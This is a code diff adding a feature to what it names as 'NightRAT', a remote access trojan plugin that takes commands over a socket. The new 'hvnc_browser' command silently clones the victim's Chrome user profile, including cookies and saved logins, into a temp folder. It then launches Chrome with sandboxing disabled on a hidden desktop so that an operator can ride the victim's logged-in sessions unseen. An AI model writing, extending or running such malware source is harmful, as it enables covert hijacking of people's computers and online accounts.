@@ -4,6 +4,9 @@
 #include <commctrl.h>
 #include <uxtheme.h>
 #include <dwmapi.h>
+#include <shlobj.h>
+#include <shellapi.h>
+#include <shlwapi.h>
 #include <propidl.h>
 #include <gdiplus.h>
 #include <objidl.h>
@@ -30,6 +33,8 @@
 #pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "uxtheme.lib")
 #pragma comment(lib, "dwmapi.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "shlwapi.lib")
 
 using json = nlohmann::json;
 using namespace Gdiplus;
@@ -1134,6 +1139,87 @@ static wstring utf8_to_wstring(const string& str) {
     return res;
 }
 
+static bool copy_directory(const wstring& source, const wstring& destination) {
+    vector<wchar_t> from;
+    from.assign(source.begin(), source.end());
+    from.push_back(L'\\');
+    from.push_back(L'*');
+    from.push_back(L'\0');
+    from.push_back(L'\0');
+
+    vector<wchar_t> to;
+    to.assign(destination.begin(), destination.end());
+    to.push_back(L'\0');
+    to.push_back(L'\0');
+
+    SHFILEOPSTRUCTW fileOp = { 0 };
+    fileOp.wFunc = FO_COPY;
+    fileOp.pFrom = from.data();
+    fileOp.pTo = to.data();
+    fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_SILENT | FOF_NOERRORUI;
+
+    return SHFileOperationW(&fileOp) == 0;
+}
+
+static void launch_browser_thread(string browserName) {
+    ensure_desktop();
+    if (!g_hHiddenDesktop) return;
+
+    WCHAR appData[MAX_PATH];
+    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData))) return;
+
+    wstring sourceProfile;
+    wstring chromePath;
+    if (browserName == "chrome.exe") {
+        sourceProfile = wstring(appData) + L"\\Google\\Chrome\\User Data";
+
+        WCHAR programFiles[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILES, NULL, 0, programFiles))) {
+            chromePath = wstring(programFiles) + L"\\Google\\Chrome\\Application\\chrome.exe";
+        }
+        if (!PathFileExistsW(chromePath.c_str()) && SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, programFiles))) {
+            chromePath = wstring(programFiles) + L"\\Google\\Chrome\\Application\\chrome.exe";
+        }
+        if (!PathFileExistsW(chromePath.c_str())) {
+            chromePath = wstring(appData) + L"\\Google\\Chrome\\Application\\chrome.exe";
+        }
+    } else {
+        return;
+    }
+
+    if (!PathFileExistsW(chromePath.c_str())) {
+        send_error("Browser executable not found.");
+        return;
+    }
+
+    WCHAR tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
+    wstring destProfile = wstring(tempPath) + L"NightRAT_ChromeProfile";
+
+    send_status("Cloning profile (this may take a while)...");
+    copy_directory(sourceProfile, destProfile);
+
+    wstring cmdLine = L"\"" + chromePath + L"\" --user-data-dir=\"" + destProfile + L"\" --no-sandbox --disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --no-first-run --no-default-browser-check";
+    vector<wchar_t> cmdLineBuf(cmdLine.begin(), cmdLine.end());
+    cmdLineBuf.push_back(L'\0');
+
+    wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+    STARTUPINFOW si = { sizeof(si) };
+    si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW;
+
+    PROCESS_INFORMATION pi = { 0 };
+    if (CreateProcessW(NULL, cmdLineBuf.data(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        g_forceFullFrame = true;
+        send_status("Chrome started on hidden desktop");
+    } else {
+        send_error("Failed to start Chrome. Error: " + to_string(GetLastError()));
+    }
+}
+
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     initialize_visual_styles();
     g_socket = sock;
@@ -1218,6 +1304,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             } else {
                 send_error("Failed to start process. Error: " + to_string(GetLastError()));
             }
+        } else if (action == "hvnc_browser") {
+            string browser = cmd.value("browser", "chrome.exe");
+            thread(launch_browser_thread, browser).detach();
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
                    action == "hvnc_char" ||
